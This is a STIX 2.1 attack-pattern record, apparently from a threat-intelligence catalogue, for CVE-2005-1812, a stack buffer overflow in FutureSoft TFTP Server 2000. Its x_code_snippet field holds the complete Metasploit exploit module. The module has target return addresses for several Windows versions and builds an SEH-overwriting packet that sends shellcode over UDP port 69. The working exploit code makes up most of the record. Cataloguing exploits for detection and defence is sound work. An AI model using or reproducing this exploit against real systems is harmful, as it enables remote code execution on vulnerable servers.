{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d40ec080-5d89-4b53-867d-a5ba2e514ae1",
    "created": "2024-08-14T16:50:29.166576Z",
    "modified": "2024-08-14T16:50:29.16658Z",
    "name": "FutureSoft TFTP Server 2000 Transfer-Mode Overflow",
    "description": " This module exploits a stack buffer overflow in the FutureSoft TFTP Server 2000 product. By sending an overly long transfer-mode string, we were able to overwrite both the SEH and the saved EIP. A subsequent write-exception that will occur allows the transferring of execution to our shellcode via the overwritten SEH. This module has been tested against Windows 2000 Professional and for some reason does not seem to work against Windows 2000 Server (could not trigger the overflow at all). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/futuresoft_transfermode.rb",
            "external_id": "futuresoft_transfermode.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1812"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the FutureSoft TFTP Server\n        2000 product. By sending an overly long transfer-mode string, we were able\n        to overwrite both the SEH and the saved EIP. A subsequent write-exception\n        that will occur allows the transferring of execution to our shellcode\n        via the overwritten SEH. This module has been tested against Windows\n        2000 Professional and for some reason does not seem to work against\n        Windows 2000 Server (could not trigger the overflow at all).\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          ['CVE', '2005-1812'],\n          ['OSVDB', '16954'],\n          ['BID', '13821']\n\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 350,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4} ], # ws2help.dll\n          ['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad} ], # ws2help.dll\n          ['Windows NT SP5/SP6a English',    { 'Ret' => 0x776a1799} ], # ws2help.dll\n          ['Windows 2003 Server English',    { 'Ret' => 0x7ffc0638} ], # PEB return\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2005-05-31'))\n\n    register_options(\n      [\n        Opt::RPORT(69)\n      ])\n\n  end\n\n  def exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sploit  = \"\\x00\\x01\" + rand_text_english(14, payload_badchars) + \"\\x00\"\n    sploit += rand_text_english(167, payload_badchars)\n    seh  = generate_seh_payload(target.ret)\n    sploit[157, seh.length] = seh\n    sploit += \"\\x00\"\n\n    udp_sock.put(sploit)\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-05-31",
    "x_mitre_platforms": [
        "win'"
    ]
}